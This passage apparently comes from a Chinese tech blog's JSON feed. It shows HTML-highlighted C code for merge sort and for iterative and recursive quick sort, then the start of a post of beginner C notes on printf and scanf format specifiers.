<span class=\"token punctuation\">(</span>end <span class=\"token operator\">-</span> start <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">// 归并排序入口函数</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">merge_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">int</span><span class=\"token operator\">*</span> reg <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>len <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>reg <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 检查内存分配是否成功</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Memory allocation failed\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span>EXIT_FAILURE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token function\">merge_sort_recursive</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> reg<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> len <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>reg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 释放内存</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>4. 快速排序</p>\n<p>迭代法</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 范围结构体</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_Range</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> start<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span> Range<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 创建新的范围</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Range <span class=\"token function\">new_Range</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> s<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    Range r<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    r<span class=\"token punctuation\">.</span>start <span class=\"token operator\">=</span> s<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    r<span class=\"token punctuation\">.</span>end <span class=\"token operator\">=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 交换两个整数</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">int</span> t <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token operator\">*</span>x <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token operator\">*</span>y <span class=\"token operator\">=</span> t<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 快速排序函数</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">quick_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>len <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 避免 len 等于负值时引发段错误（Segment Fault）</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    Range r<span class=\"token punctuation\">[</span>len<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">int</span> p <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    r<span class=\"token punctuation\">[</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">new_Range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> len <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        Range range <span class=\"token operator\">=</span> r<span class=\"token punctuation\">[</span><span class=\"token operator\">--</span>p<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>range<span class=\"token punctuation\">.</span>start <span class=\"token operator\">>=</span> range<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">int</span> mid <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>range<span class=\"token punctuation\">.</span>start <span class=\"token operator\">+</span> range<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 选取中间点为基准点</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">int</span> left <span class=\"token operator\">=</span> range<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">,</span> right <span class=\"token operator\">=</span> range<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> mid<span class=\"token punctuation\">)</span> <span class=\"token operator\">++</span>left<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 检测基准点左侧是否符合要求</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>right<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> mid<span class=\"token punctuation\">)</span> <span class=\"token operator\">--</span>right<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 检测基准点右侧是否符合要求</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;=</span> right<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span>right<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                left<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                right<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 移动指针以继续</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;=</span> right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>range<span class=\"token punctuation\">.</span>start <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">)</span> r<span class=\"token punctuation\">[</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">new_Range</span><span class=\"token punctuation\">(</span>range<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">,</span> right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>range<span class=\"token punctuation\">.</span>end <span class=\"token operator\">></span> left<span class=\"token punctuation\">)</span> r<span class=\"token punctuation\">[</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">new_Range</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">,</span> range<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 计算数组长度</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token function\">quick_sort</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 调用快速排序函数</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">// 打印排序后的数组</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>递归法</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 交换两个整数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>y<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> t <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token operator\">*</span>x <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token operator\">*</span>y <span class=\"token operator\">=</span> t<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 递归实现快速排序</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">quick_sort_recursive</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> start<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> end<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>start <span class=\"token operator\">>=</span> end<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">int</span> mid <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>end<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">int</span> left <span class=\"token operator\">=</span> start<span class=\"token punctuation\">,</span> right <span class=\"token operator\">=</span> end <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;</span> right <span class=\"token operator\">&amp;&amp;</span> arr<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            left<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">&lt;</span> right <span class=\"token operator\">&amp;&amp;</span> arr<span class=\"token punctuation\">[</span>right<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> mid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            right<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span>right<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> arr<span class=\"token punctuation\">[</span>end<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span>left<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span>end<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        left<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token function\">quick_sort_recursive</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> start<span class=\"token punctuation\">,</span> left <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token function\">quick_sort_recursive</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> left <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">// 快速排序入口函数</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">quick_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">quick_sort_recursive</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> len <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 计算数组长度</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token function\">quick_sort</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 调用快速排序函数</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token comment\">// 打印排序后的数组</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "技术",
                "技术"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/14/C%E7%AC%94%E8%AE%B01ultrasuper/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/14/C%E7%AC%94%E8%AE%B01ultrasuper/",
            "title": "C笔记ultra",
            "date_published": "2024-10-14T05:21:05.000Z",
            "content_html": "<h1 id=\"i语法\"><a class=\"anchor\" href=\"#i语法\">#</a> Ⅰ. 语法（？）</h1>\n<h4 id=\"一程序执行\"><a class=\"anchor\" href=\"#一程序执行\">#</a> <strong>一。程序执行</strong></h4>\n<ol>\n<li>解释：由该程序执行操作（python）</li>\n<li>编译：由该程序将语言翻译为机器语言，由编译出的程序执行操作（C）</li>\n</ol>\n<h4 id=\"二printf-与scanf-stdioh\"><a class=\"anchor\" href=\"#二printf-与scanf-stdioh\">#</a> <strong>二.printf 与 scanf</strong>              <strong>&lt;stdio.h&gt;</strong></h4>\n<p>\\n 表示换行，如果要直接输出，输入 \\\\n 来转义</p>\n<p>在写的程序中换行对编译器没有影响。</p>\n<p>scanf 需要 &amp; a, 但是 printf 不需要 &amp;，double 在 scanf 中必须要用 % lf</p>\n<p>scanf 里的非变量部分在输入时也必须输入，否则可能无法正确接收数据（空格为输入任意）</p>\n<blockquote>\n<p>%d(ld):\tint(long long)</p>\n<p>%f(lf):\tfloat(double,longdouble)</p>\n<p>% u:\tunsigned long long     // 即使是其他类型，也可以用 % u 输出，注意 ：</p>\n<p>% c:\t字符串                              会自动扩展其他位，比如传入 - 1 就会使所有位的都                                    % e (E):\t科学计数法                        变成 1（传入 printf 的补码 (@int 类型是这样的) )</p>\n<p>//double ff=1E-10 也是可以的，就是 1 的负 10 次方，输出要确定保留位数（%.3/4/5lf），会四舍五入。</p>\n<p>float/double 的表达是离散的，不连续，遇到不能准确表达的会就近选择（精度越高，能表达的数的间隔越小）## 见下</p>\n</blockquote>\n<p>#% d 其实时默认时 10 进制输出，不过输入可以是其他进制，会自动转化。</p>\n<p><strong>% d 后面没有空格，是只读取到整数结束为止，其他留给下一个变量</strong></p>\n<p><strong>如有，则会顺便读取整数结束后的所有空格个，这是特殊的，用于防止误读空格</strong></p>\n<p>//% o：输出 8 进制（不会自带 0）</p>\n<p>//% 